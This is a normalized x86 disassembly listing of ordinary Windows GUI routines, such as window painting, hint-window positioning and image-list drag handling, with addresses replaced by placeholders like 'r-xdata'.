movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push 0x0
push 0x0
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0xc ]
mov eax esi
call sub_48dac0
lea edx [ esp + 0x20 ]
xor ecx ecx
mov eax esi
call sub_4933e8
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xc ]
mov [ esp + 0x10 ] eax
movsx ebp [ esp + 0xe ]
mov [ esp + 0x14 ] ebp
mov eax [ esp + 0x10 ]
and eax 0xffff
shl ebp 0x10
or eax ebp
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_48f2b0
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_490b18
sub_497c28
push ebx
mov ebx edx
mov dl 0x1
call sub_477028
test eax eax
je r-xdata
pop ebx
retn
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x10002
mov edx 0x127
call sub_48f2b0
jmp r-xdata
sub bx 0x9
je r-xdata
push 0x0
mov ecx 0x20002
mov edx 0x127
call sub_48f2b0
add ebx 0xffffffed
sub bx 0x4
jae r-xdata
sub_497c74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x8 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_497cdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_493d14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_497d08
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_497d00
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_497d60
push esi
mov esi eax
mov ecx [ eax + 0x30 ]
jmp r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
test esi esi
je r-xdata
test ecx ecx
jne r-xdata
pop esi
retn
and edx 0x7f
push edx
mov ecx eax
mov eax esi
mov edx 0xb046
call sub_48db1c
mov esi ecx
mov ecx [ ecx + 0x30 ]
sub_497da4
push ebx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call RemovePropW
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call RemovePropW
pop ebx
retn
sub_497dd4
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx [ esi + 0x90 ]
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_495170
dec eax
jg r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_497e0c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
test bl bl
je r-xdata
and [ ebp + 0x54 ] 0xdfff
or [ ebp + 0x54 ] 0x2000
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x1d8 ]
test eax eax
je r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebp + 0x1d8 ]
call sub_4246e8
mov edx ebx
call sub_497e0c
inc edi
dec esi
jne r-xdata
sub_497e58
push ebx
push esi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
test [ ebx + 0x1c ] 0x2
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
test [ edx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x48 ]
mov [ esi ] eax
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4 ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1b4 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1b4 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
add esp 0x10
pop esi
pop ebx
retn
mov eax [ ebx + 0x258 ]
mov [ esi ] eax
mov eax [ ebx + 0x25c ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_497ed4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
push ebp
push sub_497f44
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48de64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_497f4b
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_497e0c
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497e0c
sub_497f50
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_48ccfc
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x1a0 ] esi
mov eax esi
mov edx ebx
call sub_48c730
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_497fac
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x1a0 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_48ce0c
test bl bl
jle r-xdata
xor eax eax
call sub_48ac58
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_497fec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_498094
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
call sub_46e950
xor eax eax
push ebp
push sub_498071
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_498078
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
xor edx edx
call sub_46e950
retn
sub_4980a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_498aa8
mov edx 0x80ffff
mov eax esi
call sub_48e120
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x78 ]
mov eax [ esi + 0x260 ]
call sub_46e7e4
mov eax [ esi + 0x260 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_46e058
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_49810c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4926c0
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_43a7f0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_492658
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_498178
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4981ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4981d5
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ReleaseDC
retn
sub_4981dc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x30 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4982f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor edx edx
mov eax 0x6
call sub_43a7f0
test al al
je r-xdata
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x78 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0xc ]
call sub_46d5ac
mov eax [ ebx + 0x260 ]
call sub_46e8c8
mov esi eax
lea edx [ ebp - 0x30 ]
mov eax ebx
call sub_48df68
mov edi [ ebp - 0x30 ]
mov eax ebx
call sub_490abc
or eax 0x810
mov ebx eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
mov [ ebp - 0x34 ] edi
mov eax [ ebp - 0x34 ]
call sub_449db8
push eax
push esi
call DrawTextW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4982f8
lea eax [ ebp - 0x30 ]
call j_sub_449348
retn
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x4
push 0x4
lea eax [ ebp - 0x10 ]
push eax
call InflateRect
call sub_44c2c8
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x2c ]
mov dl 0x2
mov eax esi
call sub_44c8ec
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x260 ]
call sub_46e8c8
mov edx eax
mov eax esi
pop ecx
call sub_44c4d4
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_498300
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x109
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_498374
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4983ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_497d48
cmp [ ebx + 0x268 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_498406
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x260 ]
call sub_46e724
mov edx eax
add edx 0x6
mov eax ebx
call sub_48d5f8
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_48df68
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x260 ]
call sub_46e740
mov edx eax
add edx 0x4
mov eax ebx
call sub_48d62c
sub_49840c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
lea esi [ ebp - 0x1c ]
xor eax eax
push ebp
push sub_4986c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x268 ] 0x1
xor edx edx
push ebp
push sub_4986a9
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_48dfa0
add [ esi + 0xc ] 0x4
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_48f3a8
lea ecx [ ebp - 0x24 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_432a5c
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
call sub_48060c
mov ebx eax
mov eax ebx
call sub_47f2c8
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x48 ]
jge r-xdata
mov eax ebx
call sub_47f294
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov eax ebx
call sub_47f2c8
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_48d5f8
mov eax ebx
call sub_47f2b0
mov edi eax
mov eax ebx
call sub_47f294
add edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
add eax [ esi + 0x4 ]
cmp edi eax
jge r-xdata
mov eax ebx
call sub_47f294
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_48d62c
mov eax ebx
call sub_47f27c
mov edi eax
mov eax ebx
call sub_47f2c8
add edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
add eax [ esi ]
cmp edi eax
jge r-xdata
mov eax ebx
call sub_47f2b0
mov edi eax
mov eax ebx
call sub_47f294
add edi eax
mov eax [ ebp - 0x8 ]
sub edi [ eax + 0x4c ]
mov [ esi + 0x4 ] edi
mov eax ebx
call sub_47f27c
cmp eax [ esi ]
jle r-xdata
mov eax ebx
call sub_47f27c
mov edi eax
mov eax ebx
call sub_47f2c8
add edi eax
mov eax [ ebp - 0x8 ]
sub edi [ eax + 0x48 ]
mov [ esi ] edi
mov eax ebx
call sub_47f2b0
cmp eax [ esi + 0xc ]
jle r-xdata
mov eax ebx
call sub_47f27c
mov [ esi ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x8 ]
call sub_4931bc
push 0x10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x26c ]
cmp eax 0xfa
jbe r-xdata
mov eax ebx
call sub_47f2b0
mov [ esi + 0x4 ] eax
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push 0x4
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call ShowWindow
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4986b0
call GetTickCount
mov edx [ ebp - 0x8 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x268 ] 0x0
retn
cmp [ rw-data ] 0x0
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoW
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x64
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoW
cmp [ ebp - 0xc ] 0x0
je r-xdata
test al al
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_49bdf8
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call [ rw-data ]
sub_4986d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xe4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4986fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_432a2c
mov eax [ esi + 0x260 ]
call sub_46e8c8
mov edi eax
mov eax esi
call sub_490abc
or eax 0xc10
mov esi eax
push esi
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push edi
call DrawTextW
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_49875c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_432a2c
call sub_44c2c8
call sub_44c3d4
test al al
jne r-xdata
call sub_44c2c8
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_44cac4
push esp
push 0x1
push 0xf
call sub_44c2c8
lea ecx [ esp + 0x1c ]
mov edx esi
call sub_44c444
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4987c4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_49423c
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
pop esi
pop ebx
retn
sub_4987ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_498844
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x80 ] esi
mov [ ebx + 0x78 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x7c ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44f4cc
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x72 ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4988b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fe2c
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x72 ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4988e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44f2fc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x72 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_498958
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x7c ]
push eax
mov ecx [ esi + 0x78 ]
mov edx [ esi + 0x80 ]
mov eax esi
call sub_498844
mov eax [ rw-data ]
mov eax [ eax ]
movzx eax [ eax + 0x44 ]
mov [ esi + 0x84 ] ax
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x70 ]
call sub_47fbf8
sub_498958
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44f2fc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x74 ]
je r-xdata
mov eax edi
call sub_4989bc
mov ebx esi
mov [ edi + 0x74 ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4987ec
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x74 ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4989bc
push ebx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x74 ] eax
sub_4989e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x74 ]
call sub_4987ec
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_498a54
push ebx
push esi
mov esi eax
mov eax esi
call sub_44f2fc
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x72 ] 0x0
je r-xdata
mov eax esi
call sub_4989bc
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x72 ] 0x0
or edx 0xffffffff
mov eax esi
call sub_498890
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x84 ]
call sub_47fbf8
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_498aa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_490f20
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x260 ] esi
mov eax esi
mov edx ebx
call sub_48c730
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_498b04
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x260 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_498b54
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_498bf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
mov edx ebx
call sub_46e950
xor eax eax
push ebp
push sub_498bcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_48c748
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_498bd6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
xor edx edx
call sub_46e950
retn
sub_498c04
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_498cb8
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_498c20
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_498c44
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_498c94
push ebx
push esi
xor esi esi
call sub_4992e0
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4992b8
mov ebx eax
inc esi
test ebx ebx
jne r-xdata
sub_498cb8
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_4992e0
mov esi eax
test esi esi
je r-xdata
movzx ebx [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_498cb8
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_498cf0
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_498d80
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov edx 0x2
call sub_498d80
jmp r-xdata
retn
sub_498d38
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_498e04
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov edx 0x2
call sub_498e04
jmp r-xdata
retn
sub_498d80
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp ebx [ eax + 0x64 ]
jne r-xdata
mov eax edi
mov ebp [ ebx + 0x14 ]
cmp al [ ebp + 0x10 ]
jne r-xdata
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x4 ]
